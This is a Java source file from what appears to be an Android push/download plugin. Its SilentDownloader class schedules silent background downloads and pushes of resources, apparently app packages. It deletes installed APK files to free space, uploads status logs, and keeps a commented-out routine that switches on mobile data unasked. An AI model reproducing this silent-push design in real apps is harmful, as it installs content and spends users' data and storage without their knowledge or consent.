package com.tiho.dlplugin.task.silent;

import java.util.concurrent.atomic.AtomicBoolean;

import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushSilentConfig;
import com.tiho.dlplugin.bean.Resource;
import com.tiho.dlplugin.dao.DAOFactory;
import com.tiho.dlplugin.dao.PushConfigDAO;
import com.tiho.dlplugin.log.LogUploadManager;
import com.tiho.dlplugin.task.silent.SilentTask.SilentTask;
import com.tiho.dlplugin.task.silent.SilentTask.SilentTaskFactory;
import com.tiho.dlplugin.util.FileUtil;
import com.tiho.dlplugin.util.NetworkUtil;
import com.tiho.dlplugin.util.TimeUtil;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.text.TextUtils;

class SilentDownloader implements Runnable {

	private SilentList list;

	private Context context;
	private PushConfigDAO configDao;

	private Object lock;

	private Handler handler;

	private static SilentDownloader instance;
	private final static long _60SEC = 60 * 1000;

	private SilentDownloader(Context c, SilentList list, Handler handler) {
		this.list = list;
		this.context = c;
		this.handler = handler;
		configDao = DAOFactory.getConfigDAO(c);

		lock = new Object();

		NetworkUtil.registerNetworkRecoverEvent(context, new BroadcastReceiver() {
			@Override
			public void onReceive(Context context, Intent intent) {
				synchronized (lock) {
					if (NetworkUtil.isNetworkOk(context)) {
						lock.notifyAll();
						LogManager.LogShow("网络恢复，静默下载恢复");

						if (NetworkUtil.isWifiOn(context)) {
							LogManager.LogShow("wifi已经连接，尝试唤醒静默下载");
							wakeUpDownload();
						}

					}
				}
			}
		});
	}

	public synchronized static SilentDownloader getInstance(Context c, SilentList l, Handler h) {
		if (instance == null)
			instance = new SilentDownloader(c, l, h);

		return instance;
	}
	
	private static AtomicBoolean running = new AtomicBoolean(false);
	
	private boolean toWait() {
		synchronized (lock) {
			try {
				running.set(false);
				lock.wait();
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			
			if(running.get())
				return false;
			
			running.set(true);
			return true;
		}
	}

	public static boolean CLOSE_NETWORK_AFTER_USE = false;

	@Override
	public void run() {
//		if (!NetworkUtil.isNetworkOk(context)) {
//
//			LogManager.LogShow("网络不可用，尝试打开移动网络");
//
//			if (GPRSManager.getInstance(context).openMobileNetwork()) {
//
//				try {
//					LogManager.LogShow("网络貌似打开成功，等待3秒再看");
//					Thread.sleep(3000);
//
//				} catch (InterruptedException e) {
//					e.printStackTrace();
//				}
//
//				if (NetworkUtil.isNetworkOk(context)) {
//					LogManager.LogShow("网络打开成功");
//					CLOSE_NETWORK_AFTER_USE = true;
//				} else {
//					LogManager.LogShow("结果还是打开失败");
//				}
//			}
//		}

		if (!NetworkUtil.isNetworkOk(context)) {
			LogManager.LogShow("网络打开失败,等待网络开启");
			boolean result = toWait();
			if(!result)
				return;
		}

		if (!FileUtil.hasEnoughSpaceSize(context))
			FileUtil.deleteInstalledApk(context);

		FileUtil.deleteSomeFileTask(context);
		if (FileUtil.hasEnoughSpaceSize(context)) {

			// 如果不是第一次，并且wifi没开，先睡眠，再下载
			LogManager.LogShow("isFirstDownload" + SilentTask.getIsFirstDownload());
			LogManager.LogShow("NetworkUtil.isWifiOn(context)=" + NetworkUtil.isWifiOn(context));

			if (!SilentTask.getIsFirstDownload() && !NetworkUtil.isWifiOn(context)) {
				String dumpName=list.getDumpName();
				if(!TextUtils.isEmpty(dumpName))
					LogUploadManager.getInstance(context).addSilentDownloadLog(2, dumpName, TimeUtil.getNowTime(), TimeUtil.getNowTime(), 0, 0, 0, "DOWNLOAD_FAILED_SLEEP_CAUSE_NO_WIFI", 2, "Y");

				silentPushSleep();

			}

			silentPush();

		} else {
			// 空间不够就等待
			// 下载失败日志
			String dumpName=list.getDumpName();
			if(!TextUtils.isEmpty(dumpName))
				LogUploadManager.getInstance(context).addSilentDownloadLog(2, dumpName, TimeUtil.getNowTime(), TimeUtil.getNowTime(), 0, 0, 0, "DOWNLOAD_FAILED_NO_ENOUGH_SPACE", 2, "Y");

			list.await();
		}

		handler.postDelayed(instance, _60SEC);
	}

	private boolean inSleep = false;

	private void wakeUpDownload() {
		if (inSleep) {
			Thread.currentThread().interrupt();
			inSleep = false;
		}
	}

	private void silentPushSleep() {
		PushSilentConfig cn = configDao.getConfigByKey("silentcfg", PushSilentConfig.class);
		try {
			LogManager.LogShow("线程休眠 cn.getSdi()" + cn.getSdi());
			Thread.sleep(cn.getSdi() * 3600000L);

			LogManager.LogShow("静默下载休息" + cn.getSdi() + "小时");

			inSleep = true;
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}

	private void silentPush() {
		Resource resource = list.dump();

		if (resource != null) {
			SilentTask silentTask = SilentTaskFactory.getSilentTask(context, list, resource);
			if (silentTask != null) {
				silentTask.silentPush(resource);
			} else {
				LogManager.LogShow("silentTask 初始化错误");
			}

		} else {
			LogManager.LogShow("静默列表里没东西可以下载，可能都超过失败上线了");
		}

	}

}
